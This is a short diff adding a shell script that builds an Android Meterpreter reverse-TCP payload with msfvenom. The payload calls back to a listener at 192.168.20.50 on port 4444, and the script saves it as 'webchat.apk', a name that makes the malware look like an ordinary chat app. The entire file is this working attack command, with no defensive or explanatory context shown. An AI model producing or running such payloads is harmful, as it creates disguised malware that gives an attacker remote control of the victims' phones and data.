@@ -1,0 +1,6 @@
+mkdir -p payload && cd payload
+
+
+msfvenom -p android/meterpreter/reverse_tcp \
+LHOST=192.168.20.50 \
+LPORT=4444 R > webchat.apk
